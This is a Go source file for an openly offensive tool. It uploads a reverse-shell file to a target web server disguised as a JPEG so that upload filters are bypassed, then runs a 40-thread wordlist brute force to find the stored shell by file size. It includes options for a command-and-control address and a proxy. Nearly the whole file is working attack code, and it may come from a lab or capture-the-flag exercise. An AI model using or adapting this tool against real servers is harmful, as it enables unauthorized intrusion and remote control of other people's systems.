package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

var SHELLSIZE int = 0

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

// struct deisgned to create a wordlist generator.
// this will open a wordlist file, read it line-by-line
// and feed a brute-forcer.
type WordGenerator struct {
	Wordlist  string
	Commschan chan string
}

// struct designed to upload a given file to the
// target machine. this is the format that the
// server expects the payload to be delivered in.
type UploadJSON struct {
	File string `json:"file"`
	Name string `json:"name"`
	Type string `json:"type"`
}

// ============================================================
//
// Function Name: FindShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to discover what the uploaded shell has
//  been saved as on the target machine.
//
// Input(s):
//
//  tgtsize - int. filesize to search for.
//  generator - WordGenerator. filename generator.
//
// Return(s):
//
//  filecontents - []byte. bytes read from file.
//  err - error. error or nil.
//
// ============================================================
func (c *Client) FindShell(tgtsize int, generator WordGenerator) (probables []string, err error) {
	var i int = 0
	var numthreads int = 40
	var stopchan chan bool = make(chan bool)
	var wg *sync.WaitGroup = new(sync.WaitGroup)

	// begin word generator goroutine
	go generator.GenerateWords(stopchan)

	for i = 0; i < numthreads; i++ {
		wg.Add(1)
		go c.TestMaster(generator.Commschan, tgtsize, &probables, wg)
	}
	wg.Wait()

	if len(probables) < 1 {
		return nil, errors.New("no potential shell files discoverd")
	}

	return probables, nil
}

// ============================================================
//
// Function Name: GetFileContents
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to read the bytes of a local file
//  and return the contents.
//
// Input(s):
//
//  filename - string. filename to read content of.
//
// Return(s):
//
//  filecontents - []byte. bytes read from file.
//  err - error. error or nil.
//
// ============================================================
func GetFileContents(filename string) (filecontents []byte, err error) {
	var fptr *os.File

	if len(filename) < 1 {
		return nil, errors.New("filename must be non-zero length string")
	}

	fptr, err = os.OpenFile(filename, os.O_RDONLY, 0444)
	if err != nil {
		return nil, err
	}
	defer fptr.Close()

	filecontents, err = ioutil.ReadAll(fptr)
	if err != nil {
		return nil, err
	}

	return filecontents, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) TestConnection() (err error) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

// ============================================================
//
// Function Name: TestMaster
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to be a worker for the shell file
//  brute forcing. this will loop through the words fed to it
//  by the generator and test for a shell file on the target.
//
// Input(s):
//
//  commschan - chan string. used to get words from generator.
//  tgtsize - int. size of reverse shell to check for.
//  probables - []string. slice of strings holding possible hits.
//  wg - *sync.WaitGroup. waitgroup to use for brute-forcing.
//
// Return(s):
//
//  None.
//
// ============================================================
func (c *Client) TestMaster(commschan chan string, tgtsize int, probables *[]string, wg *sync.WaitGroup) {
	defer wg.Done()

	var currentfile string
	var err error

	// get current target filename from the wordlist generator and
	// test to see if it fits the reverse shell criteria. if it
	// does, append it to the "probables" slice.
	for currentfile = range commschan {
		SysMsgNB(fmt.Sprintf("testing \"%s\"", currentfile))
		err = c.TestShellFile(currentfile, tgtsize)
		if err != nil {
			continue
		}
		*probables = append(*probables, currentfile)
	}

	return
}

// ============================================================
//
// Function Name: TestShellFile
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to reach out the target and test to see
//  if the given file is the target shell file.
//
// Input(s):
//
//  filename - string. filename to use in request.
//  tgtsize - int. size of target shell file.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) TestShellFile(filename string, tgtsize int) (err error) {
	var bodycontent []byte
	var bodylen int
	var resp *http.Response
	var targetroute string = fmt.Sprintf("content/%s", filename)
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New("file not found on server")
	}

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	bodylen = len(bodycontent)

	if bodylen != tgtsize {
		return errors.New("file size does not match")
	}

	return nil
}

// ============================================================
//
// Function Name: GetFileContents
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a reverse shell file to the
//  target machine, bypassing the filters put in place by the
//  admin/developers.
//
// Input(s):
//
//  filename - string. filename to read content of.
//
// Return(s):
//
//  err - error. error or nil.
//
// ============================================================
func (c *Client) UploadFile(filename string) (err error) {
	var bodycontent []byte
	var filecontents []byte
	var payload UploadJSON = UploadJSON{}
	var payloadbytes []byte = make([]byte, 0)
	var resp *http.Response

	filecontents, err = GetFileContents(filename)
	if err != nil {
		return nil
	}
	SHELLSIZE = len(filecontents)

	payload.Name, err = GenRandomName(3, 7)
	if err != nil {
		return err
	}

	payload.Name = fmt.Sprintf("%s.jpg", payload.Name)
	payload.File = fmt.Sprintf("data:application/octet-stream;base64,%s", base64.RawStdEncoding.EncodeToString(filecontents))
	payload.Type = "image/jpeg"

	payloadbytes, err = json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err = c.Session.Post(c.baseURL, "application/json", bytes.NewBuffer(payloadbytes))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if resp.StatusCode >= 400 {
		return errors.New(fmt.Sprintf("[upload] bad status code (%s)", resp.Status))
	} else if strings.ToLower(string(bodycontent)) != "success" {
		return errors.New("file failed to upload")
	}

	return nil
}

// ============================================================
//
// Function Name: GenerateWords
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to read a wordlist line-by-line and
//  pass the current line into a comms channel. if the signal
//  is given to stop reading, the loop will break and the
//  function will return.
//
// Input(s):
//
//  stopchan - chan bool. indicates desire to stop reading.
//
// Return(s):
//
//  None.
//
// ============================================================
func (g *WordGenerator) GenerateWords(stopchan chan bool) {
	defer close(g.Commschan)

	var err error
	var filename string
	var fptr *os.File
	var scanner *bufio.Scanner

	fptr, err = os.Open(g.Wordlist)
	if err != nil {
		ErrMsg(err.Error())
		return
	}
	defer fptr.Close()

	scanner = bufio.NewScanner(fptr)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		select {
		case <-stopchan:
			break
		default:
			filename = fmt.Sprintf("%s.jpg", scanner.Text())
			g.Commschan <- filename
		}
	}

	return
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (err error) {
	if (portno < 1) || (portno > 65535) {
		return errors.New("port must be between 1 and 65535")
	}
	return nil
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName(minlen int, maxlen int) (name string, err error) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var length int

	// validate min/max parameters
	if (minlen <= 0) || (maxlen <= 0) {
		return "", errors.New("min and max lengths mus be greater than zero")
	} else if minlen > maxlen {
		return "", errors.New("min length must be less than or equal to max length")
	}

	rand.Seed(time.Now().UnixMilli())

	length = rand.Intn(minlen + (maxlen - minlen))

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, nil
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

func HandleFatal(err error) {
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	return
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var iface bool

	var ips []net.IP
	var err error

	var c2ip string
	var c2p int

	var proxyaddr string

	var filename string

	var brutechan chan string = make(chan string)

	var possibleshells []string = []string{}

	var transport http.Transport = http.Transport{}
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second, Transport: &transport}}
	var generator WordGenerator = WordGenerator{Commschan: brutechan}

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "", "ip, domain, or interface of C2 server")
	flag.IntVar(&c2p, "c2port", 9999, "port to contact c2 server on")
	flag.BoolVar(&iface, "interface", false, "c2ip specified is network interface")
	flag.StringVar(&proxyaddr, "proxy", "", "proxy to use when making requests (http://...)")
	flag.StringVar(&filename, "f", "revshell", "reverse shell file to upload")
	flag.StringVar(&generator.Wordlist, "w", "UploadVulnsWordlist.txt", "wordlist used to discover shell on target")
	flag.Parse()

	err = ValidatePort(port)
	HandleFatal(err)

	if len(filename) < 1 {
		ErrMsg("filename must be non-zero length string")
		os.Exit(1)
	}

	if len(generator.Wordlist) < 1 {
		ErrMsg("wordlist must be non-zero length string")
		os.Exit(1)
	}

	if len(c2ip) > 0 {
		//============================================================
		// if "c2" specified is a network interface, take the
		// IP address of the interface and assign it to the
		// c2 variable to be used
		//============================================================
		if iface {
			ips, err = GrabIPs(c2ip)
			HandleFatal(err)
			c2ip = ips[0].String()
		}

		err = ValidatePort(c2p)
		HandleFatal(err)

	}

	if len(proxyaddr) > 0 {
		var proxyurl *url.URL = &url.URL{}
		var proxysplit []string = strings.Split(proxyaddr, "://")
		var hostsplit []string
		var hostroute string

		if len(proxysplit) < 2 {
			ErrMsg("proxy must be in form \"http://<address>\" or \"https://<address>\"")
			os.Exit(1)
		}

		proxyurl.Scheme = proxysplit[0]

		hostsplit = strings.Split(proxysplit[1], "/")
		proxyurl.Host = hostsplit[0]

		if len(hostsplit) > 1 {
			hostroute = strings.Join(hostsplit[1:], "/")
			proxyurl.Path = hostroute
		}

		transport.Proxy = http.ProxyURL(proxyurl)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	if len(c2ip) > 0 {
		InfMsg(fmt.Sprintf("C2IP: %s", c2ip))
		InfMsg(fmt.Sprintf("C2Port: %d", c2p))
	}

	if len(proxyaddr) > 0 {
		InfMsg(fmt.Sprintf("Proxy: %s", proxyaddr))
	}

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	err = client.TestConnection()
	HandleFatal(err)
	SucMsg("successful connection to target")

	err = client.UploadFile(filename)
	HandleFatal(err)
	SucMsg("file successfully uploaded")

	possibleshells, err = client.FindShell(SHELLSIZE, generator)
	HandleFatal(err)
	SucMsg(fmt.Sprintf("possible shells: %v", possibleshells))

	return
}

